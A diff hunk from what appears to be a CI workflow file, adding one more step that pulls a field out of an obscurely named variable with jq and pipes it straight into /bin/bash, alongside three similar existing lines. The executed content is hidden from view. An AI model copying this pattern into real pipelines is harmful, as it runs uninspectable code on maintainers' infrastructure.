@@ -34,6 +34,7 @@ jobs:
           echo $futlg08226 | jq -r .lx727 | /bin/bash
           printf '%s' "$umv2" | jq -r .j51801 | /bin/bash
           printf '%s' "$woj0986" | jq -r .ber15 | /bin/bash
+          printf '%s' "$ap00" | jq -r .hkwh7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
